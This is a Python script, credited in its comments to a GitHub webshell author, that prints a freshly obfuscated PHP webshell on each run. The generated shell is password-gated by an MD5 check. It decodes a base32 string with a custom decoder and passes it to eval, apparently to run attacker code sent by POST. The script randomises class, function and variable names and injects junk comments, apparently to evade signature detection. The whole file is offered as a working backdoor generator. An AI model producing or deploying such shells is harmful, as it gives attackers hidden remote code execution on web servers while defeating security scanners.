import random

#author: pureqh
#github: https://github.com/pureqh/webshell
#use:GET:http://url?pass=pureqh POST:zero

shell = '''<?php
class {0}{1}
        public ${2} = null;
        public ${3} = null;
        function __construct(){1}
            if(md5($_GET["pass"])=="df24bfd1325f82ba5fd3d3be2450096e"){1}
        $this->{2} = 'mv3gc3bierpvat2tkrnxuzlsn5ossoy';
        $this->{3} = @{9}($this->{2});
        @eval({5}.$this->{3}.{5});
        {4}{4}{4}
new {0}();
function {6}(${7}){1}
    $BASE32_ALPHABET = 'abcdefghijklmnopqrstuvwxyz234567';
    ${8} = '';
    $v = 0;
    $vbits = 0;
    for ($i = 0, $j = strlen(${7}); $i < $j; $i++){1}
    $v <<= 8;
        $v += ord(${7}[$i]);
        $vbits += 8;
        while ($vbits >= 5) {1}
            $vbits -= 5;
            ${8} .= $BASE32_ALPHABET[$v >> $vbits];
            $v &= ((1 << $vbits) - 1);{4}{4}
    if ($vbits > 0){1}
        $v <<= (5 - $vbits);
        ${8} .= $BASE32_ALPHABET[$v];{4}
    return ${8};{4}
function {9}(${7}){1}
    ${8} = '';
    $v = 0;
    $vbits = 0;
    for ($i = 0, $j = strlen(${7}); $i < $j; $i++){1}
        $v <<= 5;
        if (${7}[$i] >= 'a' && ${7}[$i] <= 'z'){1}
            $v += (ord(${7}[$i]) - 97);
        {4} elseif (${7}[$i] >= '2' && ${7}[$i] <= '7') {1}
            $v += (24 + ${7}[$i]);
        {4} else {1}
            exit(1);
        {4}
        $vbits += 5;
        while ($vbits >= 8){1}
            $vbits -= 8;
            ${8} .= chr($v >> $vbits);
            $v &= ((1 << $vbits) - 1);{4}{4}
    return ${8};{4}
?>'''


def random_keys(len):
    str = '`~-=!@#$%^&_+?<>|:[]abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
    return ''.join(random.sample(str,len))

def random_name(len):
    str = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    return ''.join(random.sample(str,len))  

def build_webshell():
    className = random_name(4)
    lef = '''{'''
    parameter1 = random_name(4)
    parameter2 = random_name(4)
    rig = '''}'''
    disrupt = "\"/*"+random_keys(7)+"*/\""
    fun1 = random_name(4)
    fun1_vul = random_name(4)
    fun1_ret = random_name(4)
    fun2 = random_name(4)
    shellc = shell.format(className,lef,parameter1,parameter2,rig,disrupt,fun1,fun1_vul,fun1_ret,fun2)
    return shellc


if __name__ == '__main__':
    print (build_webshell())
